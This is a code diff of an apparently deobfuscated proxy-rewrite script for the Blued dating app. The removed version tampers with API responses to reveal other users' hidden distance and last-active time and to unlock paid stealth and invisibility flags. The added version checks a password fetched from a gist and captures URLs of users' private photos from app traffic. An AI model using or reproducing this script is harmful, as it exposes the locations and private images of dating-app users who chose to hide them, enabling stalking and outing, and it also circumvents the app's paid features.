@@ -1,114 +1,59 @@
-//Wed Jul 17 2024 11:13:12 GMT+0000 (Coordinated Universal Time)
+//Sat Jul 20 2024 04:54:44 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-function _0x3b4d5a(_0x1644a3) {
-  return btoa(_0x1644a3);
-}
-function _0x2f5663(_0x3d87cb) {
-  return atob(_0x3d87cb);
-}
-const _0x1887e = "RXJpYzEwNjk=",
-  _0x786a0e = $persistentStore.read("EricPassword");
-function _0x504075(_0xede0e9) {
-  const _0x2d2a61 = _0x3b4d5a(_0xede0e9);
-  return _0x2d2a61 === _0x1887e;
-}
-!_0x786a0e && $persistentStore.write(_0x1887e, "EricPassword");
-let _0x4feafb = $response.body,
-  _0x2c72ce = JSON.parse(_0x4feafb);
-console.log("Original response body:", JSON.stringify(_0x2c72ce, null, 2));
-const _0x2e1946 = /users\/(\d+)/,
-  _0x51b6d1 = $request.url.match(_0x2e1946);
-if (!_0x504075(_0x786a0e)) console.error("密码验证失败"), $done({
-  "body": JSON.stringify({
-    "error": "密码验证失败，请检查 BoxJS 配置"
-  })
-});else {
-  if (_0x51b6d1) {
-    const _0x1a5c42 = _0x51b6d1[1],
-      _0x7c40c = "https://argo.blued.cn/users/" + _0x1a5c42 + "/basic";
-    console.log("User ID:", _0x1a5c42);
-    console.log("Fetching URL:", _0x7c40c);
-    const _0x5b3176 = $request.headers.authorization;
-    console.log("Authorization header:", _0x5b3176);
-    const _0x2d008b = {
-      "authority": "argo.blued.cn",
-      "accept": "*/*",
-      "x-client-color": "light",
-      "content-type": "application/json",
-      "accept-encoding": "gzip, deflate, br",
-      "user-agent": "Mozilla/5.0 (iPhone; iOS 16.1.1; Scale/3.00) iOS/300907_0.9.7_6972_0921 (Asia/Shanghai) app/1",
-      "accept-language": "zh-CN",
-      "authorization": _0x5b3176
-    };
-    $httpClient.get({
-      "url": _0x7c40c,
-      "headers": _0x2d008b
-    }, function (_0x30762d, _0x556e6c, _0x29fbd0) {
-      if (_0x30762d) console.error("Error fetching data:", _0x30762d), _0x2372b(_0x2c72ce);else try {
-        let _0x4772dd = JSON.parse(_0x29fbd0);
-        console.log("Fetched data:", JSON.stringify(_0x4772dd, null, 2));
-        if (_0x4772dd && _0x4772dd.data && _0x4772dd.data.length > 0) {
-          const _0x1730d7 = _0x4772dd.data[0];
-          if (_0x1730d7.last_operate !== undefined && _0x1730d7.distance !== undefined) {
-            console.log("Fetched data contains required fields");
-            const _0x5317be = _0x1730d7.last_operate,
-              _0x443003 = parseFloat(_0x1730d7.distance).toFixed(2) + "km";
-            if (_0x2c72ce.data && _0x2c72ce.data.length > 0) {
-              const _0x3584f4 = _0x2c72ce.data[0];
-              console.log("Original last_operate:", _0x3584f4.last_operate);
-              console.log("Original distance:", _0x3584f4.distance);
-              _0x3584f4.last_operate = _0x5317be;
-              _0x3584f4.location = _0x443003;
-              _0x3584f4.is_hide_distance = 0;
-              _0x3584f4.is_hide_last_operate = 0;
-              _0x3584f4.is_global_view_secretly = 1;
-              _0x3584f4.is_invisible_all = 1;
-              _0x3584f4.presonal_private_switch = 1;
-              _0x3584f4.is_role_stealth = 1;
-              _0x3584f4.black_allowed_count = 999;
-              _0x3584f4.is_traceless_access = 1;
-              _0x3584f4.avatar = _0x3584f4.latest_avatar;
-              console.log("Updated last_operate:", _0x3584f4.last_operate);
-              console.log("Updated distance:", _0x3584f4.location);
-              console.log("Updated avatar:", _0x3584f4.avatar);
-            } else {
-              console.error("Original response does not contain required data fields");
-            }
-            _0x1730d7.is_hide_distance = 0;
-            _0x1730d7.is_hide_last_operate = 0;
-            console.log("Modified fetched data:", JSON.stringify(_0x1730d7, null, 2));
-          } else {
-            console.error("Fetched data does not contain required fields");
-          }
-          console.log("Modified response body:", JSON.stringify(_0x2c72ce, null, 2));
-          $done({
-            "body": JSON.stringify(_0x2c72ce)
-          });
-        } else console.error("Fetched data does not contain required fields"), _0x2372b(_0x2c72ce);
-      } catch (_0x414648) {
-        console.error("Error parsing data:", _0x414648);
-        _0x2372b(_0x2c72ce);
-      }
-    });
-  } else $done({
-    "body": JSON.stringify(_0x2c72ce)
-  });
-  function _0x2372b(_0x4b6940) {
-    if (_0x4b6940.data && _0x4b6940.data.length > 0) {
-      _0x4b6940.data[0].is_hide_distance = 0;
-      _0x4b6940.data[0].is_hide_last_operate = 0;
-      _0x4b6940.data[0].is_global_view_secretly = 1;
-      _0x4b6940.data[0].is_invisible_all = 1;
-      _0x4b6940.data[0].presonal_private_switch = 1;
-      _0x4b6940.data[0].is_role_stealth = 1;
-      _0x4b6940.data[0].black_allowed_count = 999;
-      _0x4b6940.data[0].is_traceless_access = 1;
-      _0x4b6940.data[0].avatar = _0x4b6940.data[0].latest_avatar;
-      delete _0x4b6940.data[0].distance;
+const _0x36ff5a = new Env("Eric捕获pic");
+(async () => {
+  try {
+    function _0x3ed50d(_0x58cf26) {
+      return btoa(_0x58cf26);
     }
-    $done({
-      "body": JSON.stringify(_0x4b6940)
-    });
+    function _0xff2713(_0x49b71a) {
+      return atob(_0x49b71a);
+    }
+    async function _0x45f9d2() {
+      const _0x21aa92 = await fetch("https://gist.githubusercontent.com/Alex0510/2f220cbae58f770e572c688594d52393/raw/password.js"),
+        _0x18b9ea = await _0x21aa92.text();
+      return _0x18b9ea.trim();
+    }
+    const _0x27d1e1 = _0x36ff5a.getdata("EricPassword"),
+      _0x1b2495 = _0x36ff5a.getdata("scriptpic");
+    function _0x3585d1(_0x270e53, _0x31e2c3) {
+      const _0x2d44ae = _0x3ed50d(_0x270e53);
+      return _0x2d44ae === _0x31e2c3;
+    }
+    !_0x27d1e1 && _0x36ff5a.setdata("TG联系咨询", "EricPassword");
+    if (_0x1b2495 !== "true") {
+      console.log("Script is disabled via BoxJS.");
+      _0x36ff5a.done({});
+      return;
+    }
+    const _0x1b38e6 = await _0x45f9d2();
+    if (!_0x3585d1(_0x27d1e1, _0x1b38e6)) {
+      console.error("密码验证失败");
+      _0x36ff5a.msg("密码验证失败", "请检查 BoxJS 配置中的密码", "");
+      _0x36ff5a.done({});
+      return;
+    }
+    const _0x492c85 = $request.url,
+      _0x2bd1bd = $request.headers;
+    if (_0x2bd1bd["user-agent"] && (_0x2bd1bd["user-agent"].indexOf("Blued") !== -1 || _0x2bd1bd["user-agent"].indexOf("Blued") !== -1)) {
+      try {
+        const _0xccddc3 = _0x36ff5a.getdata("pngUrl");
+        if (!_0xccddc3 || _0xccddc3 !== _0x492c85) {
+          _0x36ff5a.setdata(_0x492c85, "pngUrl");
+          _0x36ff5a.msg("Eric已成功捕获baby密照", "点击此通知查看PNG", "", {
+            "open-url": _0x492c85,
+            "media-url": _0x492c85
+          });
+        }
+      } catch (_0x23a881) {
+        _0x36ff5a.logErr(_0x23a881);
+        _0x36ff5a.msg("代码执行出错", "", _0x23a881.message);
+      }
+    }
+    _0x36ff5a.done({});
+  } catch (_0x23eeff) {
+    console.error(_0x23eeff);
+    _0x36ff5a.done({});
   }
-}
+})();
